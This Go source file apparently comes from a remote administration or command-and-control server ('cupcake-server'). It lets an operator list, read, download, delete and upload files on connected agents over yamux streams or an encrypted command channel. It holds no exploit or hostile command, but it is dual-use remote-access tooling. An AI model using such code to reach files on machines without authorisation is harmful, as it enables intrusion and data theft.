package services

import (
	"cupcake-server/pkg/globals"
	"cupcake-server/pkg/utils"
	"encoding/json"
	"fmt"
	"github.com/hashicorp/yamux"
	"io"
	"time"
)

// Helper: GetAgentSession retrieves the Yamux session for a TCP agent
func GetAgentSession(agentID string) (*yamux.Session, bool) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, false
	}
	client := val.(*globals.Client)
	if client.YamuxSession == nil {
		return nil, false
	}
	return client.YamuxSession, true
}

type FsRequest struct {
	Action string   `json:"action"` // "list", "read", "rm"
	Path   string   `json:"path"`
	Paths  []string `json:"paths,omitempty"`
}

type FsResponse struct {
	Status      string      `json:"status"`
	Error       string      `json:"error,omitempty"`
	Files       interface{} `json:"files,omitempty"`
	CurrentPath string      `json:"current_path,omitempty"`
	Content     string      `json:"content,omitempty"`
}

func GetFileList(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "list", Path: path})
}

func ReadFile(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "read", Path: path})
}

func DownloadFile(agentID, path string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "download", Path: path})
}

func DeleteFiles(agentID string, paths []string) (*FsResponse, error) {
	return callFsAgent(agentID, FsRequest{Action: "rm", Paths: paths})
}

func callFsAgent(agentID string, req FsRequest) (*FsResponse, error) {
	session, exists := GetAgentSession(agentID)
	if !exists {
		// ⚡️ FALLBACK: Use JSON-based command channel if Yamux is not supported/online (e.g. WebSocket agents)
		return callFsAgentFallback(agentID, req)
	}

	stream, err := session.Open()
	if err != nil {
		// Fallback on stream failure too
		return callFsAgentFallback(agentID, req)
	}
	defer stream.Close()

	// 1. Send Header (YamuxStreamFS)
	if _, err := stream.Write([]byte{utils.YamuxStreamFS}); err != nil {
		return nil, err
	}

	// ⚡️ FIX: Use Encoder directly (No Binary Length Prefix!)
	if err := json.NewEncoder(stream).Encode(req); err != nil {
		return nil, fmt.Errorf("failed to send request: %v", err)
	}

	// 2. Read Response - ROBUST MODE (Read all until EOF then unmarshal)
	// 与 websocket.go 单帧读超时 120s 对齐 — 大文件 / 慢链路下 15s 根本来不及传完。
	// list/read 都走 Yamux FS 0x03 全量读整 JSON(含 base64 整文件),必须放宽。
	stream.SetReadDeadline(time.Now().Add(120 * time.Second))
	
	data, err := io.ReadAll(stream)
	if err != nil {
		return nil, fmt.Errorf("read stream failed: %v", err)
	}

	var resp FsResponse
	if err := json.Unmarshal(data, &resp); err != nil {
		return nil, fmt.Errorf("unmarshal failed: %v | Raw: %s", err, string(data))
	}

	if resp.Status == "error" {
		return nil, fmt.Errorf("agent error: %s", resp.Error)
	}

	return &resp, nil
}

func callFsAgentFallback(agentID string, req FsRequest) (*FsResponse, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return nil, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	// Map FsRequest to Protocol Command
	cmdType := ""
	switch req.Action {
	case "list":
		cmdType = "file_ls"
	case "read":
		cmdType = "file_download" // Agent uses file_download to return bytes
	case "download":
		cmdType = "file_download" // Agent uses file_download for binary too
	case "rm":
		cmdType = "file_delete" // Agent uses file_delete
	default:
		return nil, fmt.Errorf("unsupported fallback action: %s", req.Action)
	}

	reqID := fmt.Sprintf("FS-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType: cmdType,
			Path:        req.Path,
			ReqID:       reqID,
		},
	}
	
	// If it's a multi-file delete, we pass them in Content
	if req.Action == "rm" && len(req.Paths) > 0 {
		pathsJson, _ := json.Marshal(req.Paths)
		msg.Payload = globals.CommandPayload{
			CommandType:    cmdType,
			CommandContent: string(pathsJson),
			ReqID:          reqID,
		}
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return nil, err
	}

	select {
	case res := <-resChan:
		pMap := res.(map[string]interface{})
		
		var fsResp FsResponse
		fsResp.Status = "ok"
		
		// Parse based on command type
		if cmdType == "file_ls" {
			if stdout, ok := pMap["stdout"].(string); ok {
				var files interface{}
				if err := json.Unmarshal([]byte(stdout), &files); err == nil {
					fsResp.Files = files
				}
			}
		} else if cmdType == "file_download" {
			if stdout, ok := pMap["stdout"].(string); ok {
				fsResp.Content = stdout // Base64
			}
		}
		
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return nil, fmt.Errorf("%s", stderr)
		}

		return &fsResp, nil
	case <-time.After(120 * time.Second):
		return nil, fmt.Errorf("agent response timeout")
	}
}

// DownloadChunk calls the file_download_chunk command on the Agent
func DownloadChunk(agentID, path string, offset uint64, size int) (string, bool, error) {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return "", false, fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("FSDC-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	cmdContent, _ := json.Marshal(map[string]interface{}{
		"offset": offset,
		"size":   size,
	})

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "file_download_chunk",
			CommandContent: string(cmdContent),
			Path:           path,
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return "", false, err
	}

	select {
	case res := <-resChan:
		pMap := res.(map[string]interface{})
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return "", false, fmt.Errorf("%s", stderr)
		}
		
		if stdout, ok := pMap["stdout"].(string); ok {
			var chunkResp struct {
				Data  string `json:"data"`
				IsEOF bool   `json:"is_eof"`
			}
			if err := json.Unmarshal([]byte(stdout), &chunkResp); err == nil {
				return chunkResp.Data, chunkResp.IsEOF, nil
			}
		}
		return "", false, fmt.Errorf("invalid response format")
	case <-time.After(120 * time.Second):
		return "", false, fmt.Errorf("agent chunk response timeout")
	}
}

// UploadChunk calls the file_upload_chunk command on the Agent
func UploadChunk(agentID, path, dataBase64 string, isAppend bool) error {
	val, ok := globals.Clients.Load(agentID)
	if !ok {
		return fmt.Errorf("agent offline")
	}
	client := val.(*globals.Client)

	reqID := fmt.Sprintf("FSUC-%d", globals.GetNextReqID())
	resChan := make(chan interface{}, 1)
	globals.PendingResponses.Store(reqID, resChan)
	defer globals.PendingResponses.Delete(reqID)

	cmdContent, _ := json.Marshal(map[string]interface{}{
		"is_append": isAppend,
	})

	msg := globals.MessageWrapper{
		MsgType: "command",
		Payload: globals.CommandPayload{
			CommandType:    "file_upload_chunk",
			CommandContent: string(cmdContent),
			Path:           path,
			Data:           dataBase64,
			ReqID:          reqID,
		},
	}

	if err := WriteEncryptedMessage(client, msg); err != nil {
		return fmt.Errorf("send encrypted command: %w", err)
	}

	// 与 websocket.go 单帧读超时对齐，给 Yamux 拥塞和 agent 落盘 IO 留余量。
	// 30s 过短，250 片里任一片尾部抖动即整体失败；120s 覆盖慢链路 + 高负载。
	timeout := 120 * time.Second
	select {
	case res := <-resChan:
		pMap, ok := res.(map[string]interface{})
		if !ok {
			return fmt.Errorf("invalid agent response type")
		}
		if stderr, ok := pMap["stderr"].(string); ok && stderr != "" {
			return fmt.Errorf("%s", stderr)
		}
		return nil
	case <-time.After(timeout):
		return fmt.Errorf("agent chunk response timeout after %s (req_id=%s path=%s append=%v b64_len=%d)",
			timeout, reqID, path, isAppend, len(dataBase64))
	}
}
